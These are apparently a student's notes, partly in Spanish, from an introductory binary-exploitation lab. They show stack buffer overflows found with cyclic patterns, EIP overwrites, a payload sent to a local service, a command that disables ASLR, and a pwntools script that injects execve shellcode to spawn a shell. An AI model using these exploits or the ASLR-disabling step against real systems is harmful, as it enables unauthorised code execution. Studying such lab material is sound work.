# checksec
>>checksec binario

RELRO 
Stack Canary
NX 
PIE

# cyclic
>>gdb intro2pwn3
>>r < alphabet # buffer overflow

cyclic 100 > pattern # para crear random strings

>>gdb intro2pwn3
>>print& print_flag (lugar donde empieza la funciÃ²n print_flag)
>>0x8048536

.intro2pwn3 < attack

from pwn import *

padding = cyclic(cyclic_find('taaa'))
eip = p32(0x8048536)
payload = padding + eip

print(payload)

# networking
from pwn import *

connect = remote('127.0.0.1', 1337)
print(connect.recvn(18))

payload = 'A'*32
payload += p32(0xdeadbeef)

connect.send(payload)
print(connect.recvn(34))

# shellcode
# disable aslr
echo 0 | tee /proc/sys/kernel/randomize_va_space

--------
from pwn import *

proc = process('./intro2pwnFinal')
proc.recvline()

padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd510+200)
nop_slide = "\x90"*1000
shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"

payload = padding + eip + nop_slide + shellcode

proc.send(payload)
proc.interactive()
